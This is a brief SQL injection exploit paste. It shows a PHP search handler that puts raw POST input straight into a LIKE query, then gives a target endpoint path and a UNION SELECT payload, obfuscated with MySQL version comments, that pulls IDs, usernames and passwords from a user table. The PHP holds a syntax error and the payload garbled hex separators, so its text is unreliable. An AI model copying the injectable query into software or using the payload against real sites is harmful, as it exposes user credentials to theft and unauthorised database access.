$SQL = "SELECT * FROM customer_details";
if(isset($_POST['Search']) AND trim($_POST['searchtxt'])!="")
{
    $SQL = "SELECT * FROM customer_details WHERE customer_name LIKE '%".$_POST['searchtxt']."%' OR customer_address LIKE '%".$_POST['searchtxt']."%' OR customer_contact1 LIKE '%"..$_POST['searchtxt']."%' OR customer_contact1 LIKE '%".$_POST['searchtxt']."%'";
}

/.urls/thermooptics/com/Baron_Samedi.php

POST
searchtxt=1(inject)&Search=Search

searchtxt=1' /*!UNION*/ /*!SELECT*/ 1,/*!
12345CONCAT(id,03x3a, username,03xa, password)*/,3,4,5,6+from stock_user-- -&Search=Search
